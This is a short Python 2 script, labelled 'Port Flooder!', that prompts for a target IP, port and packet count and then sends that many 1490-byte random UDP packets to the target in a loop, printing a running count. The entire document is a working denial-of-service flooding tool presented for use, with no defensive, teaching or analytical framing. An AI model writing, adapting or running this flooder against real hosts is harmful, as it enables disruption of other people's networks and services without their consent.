print "..."
import os
import time
import random
import socket
sent = 0
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
print "Port Flooder!"
ip = raw_input("~ IP: ")
port = input("~ Port: ")
packetsToSend = int(input('~ Number of packets to send: '))
os.system("clear")
print("flooding ",port," port"," on ip",ip)
print "Started!"
time.sleep(0.1)
while sent < packetsToSend:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port
     print "Sent %s packets to ip: %s in port:%s"%(sent,ip,port)
